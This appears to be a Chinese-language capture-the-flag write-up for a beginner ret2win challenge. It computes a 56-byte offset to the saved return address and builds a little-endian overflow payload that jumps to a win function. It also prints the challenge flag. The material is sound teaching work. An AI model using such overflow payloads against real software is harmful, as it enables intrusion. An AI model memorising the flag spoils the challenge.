# Stack BOF School

## 题目简述

题目是交互式 ret2win 教程。`vulnerable_function` 中只有 0x20 字节栈缓冲区，却允许持续写入最多 0x40 字节，并实时显示栈布局及 `win` 地址。目标是覆盖保存的返回地址，让函数返回到 `win` 读取 flag。

## 解题过程

源码在 `buffer` 上方显示保存的 RBP 与返回地址，并明确读取 `buffer[0x38]` 作为返回目标。因此从缓冲区起点到返回地址的偏移是：

```text
0x38 = 56 bytes
```

程序允许用 `\hh` 输入任意原始字节。先填充 56 字节，再按小端序写入界面泄露的 `win` 地址。例如官方构建中的地址为 `0x401608`，原始字节应是：

```text
08 16 40 00 00 00 00 00
```

等价 payload 结构为：

```python
payload = b"A" * 0x38 + p64(win_address)
```

提交后按回车结束输入，函数执行 `ret` 时跳入 `win`，得到：

```text
grey{d1d_y0u_n0t1ce_m3m0ry_1n_l1ttl3_3nd14n_and_the_difference_between_raw_bytes_and_their_hex_representations?}
```

## 方法总结

ret2win 的基本步骤是确定溢出点、计算到保存返回地址的偏移、按目标架构字节序写入函数地址。题目还强调了“十六进制显示”和“实际原始字节”的区别：字符串 `401608` 并不等于地址的八字节小端表示。
